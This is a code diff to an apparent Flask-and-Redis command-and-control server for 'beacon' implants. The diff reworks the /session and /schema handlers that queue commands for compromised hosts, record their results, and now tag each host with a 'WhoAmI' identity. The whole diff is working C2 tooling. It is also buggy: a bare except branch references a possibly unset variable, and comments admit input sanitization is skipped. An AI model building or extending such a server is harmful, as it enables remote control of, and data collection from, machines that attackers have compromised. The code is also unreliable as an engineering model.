@@ -18,30 +18,6 @@ conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 app = Flask(__name__)
 
 
-@app.route("/")
-def home():
-    # Grab the appsessionid value from the headers
-    uuid = request.headers['APPSESSIONID']
-    if set(uuid).difference(string.ascii_letters + string.digits):
-        # We're not going to bother with input sanitization here
-        # If we receive special characters just drop it entirely
-        pass
-    else:
-        # I want to add a way to add the date here...
-        # As well as last check in date
-        # Lets convert the command struct to a JSON object
-        structure = {
-            "Command": "0",
-            "LastInteraction": "0",
-            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "Result": "0"
-        }
-        structure = json.dumps(structure)  # Dump the json
-        # Write the message value to the beacon:UUID key
-        conn.hset('UUID', uuid, structure)
-        return ('')
-
-
 @app.route('/session', methods=['GET'])
 def session():
     # This function handles the beacon requesting a command
@@ -59,14 +35,16 @@ def session():
             comm = json.loads(structure)  # Load it into a new var
             Command = comm["Command"]  # Grab the command var from the object
             LastInteraction = comm["LastInteraction"]
-            Res = comm["Result"]
+            result = comm["Result"]
+            whoami = comm["WhoAmI"]
             # Set the command to 0
             structure = {
-                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
+                "WhoAmI": f"{whoami}",
+                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
                 "Command": "0",
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-                "Result": f"{Res}"
+                "Result": f"{result}"
             }
             structure = json.dumps(structure)  # Dump the json
             # Write the message value to the beacon:UUID key
@@ -81,32 +59,49 @@ def schema():
     # CURRENT ISSUE
     # IT'S SENDING TO SCHEMA
     # BUT SCHEMA CAN'T HANDLE CREATING NEW UUIDS
+    # Set a default value on checkin to create the hostname/whoami to identify the beacon [needs testing]
     uuid = request.headers['APPSESSIONID']
     result = request.headers['Res']
-    command = conn.hget('UUID', uuid)  # Get the struct
-    command = command.decode()  # Decode it from bytes
-    command = json.loads(command)  # it's returned as string so convert it to dict
-    structure = json.dumps(command)  # Dump the dict to json
-    comm = json.loads(structure)  # Load it into a new var
-    LastInteraction = comm["LastInteraction"]
-    print(request.headers)
-    if set(uuid).difference(string.ascii_letters + string.digits):
-        # We're not going to bother with input sanitization here
-        # If we receive special characters just drop it entirely
-        pass
-    else:
-        # Let's convert the command struct to a JSON object
+    try:
+        command = conn.hget('UUID', uuid)  # Get the struct
+        command = command.decode()  # Decode it from bytes
+        command = json.loads(command)  # it's returned as string so convert it to dict
+        structure = json.dumps(command)  # Dump the dict to json
+        comm = json.loads(structure)  # Load it into a new var
+        LastInteraction = comm["LastInteraction"]
+        whoami = comm["WhoAmI"]
+        print(request.headers)
+        if set(uuid).difference(string.ascii_letters + string.digits):
+            # We're not going to bother with input sanitization here
+            # If we receive special characters just drop it entirely
+            pass
+        else:
+            # Let's convert the command struct to a JSON object
+            structure = {
+                "WhoAmI": f"{whoami}",
+                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
+                "Command": "0",
+                "LastInteraction": f"{LastInteraction}",
+                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
+                "Result": f"{result}"
+            }
+            structure = json.dumps(structure)  # Dump the json
+            # Write the message value to the beacon:UUID key
+            conn.hset('UUID', uuid, structure)
+            return ''
+    except:
         structure = {
-            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
+            "WhoAmI": f"{whoami}",
+            "Retrieved": "0",  # Reset retrieved so we know the command was picked up
             "Command": "0",
-            "LastInteraction": f"{LastInteraction}",
+            "LastInteraction": "0",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "Result": f"{result}"
+            "Result": "0"
         }
         structure = json.dumps(structure)  # Dump the json
         # Write the message value to the beacon:UUID key
         conn.hset('UUID', uuid, structure)
-        return ('')
+        return ''
 
 
 def serve():
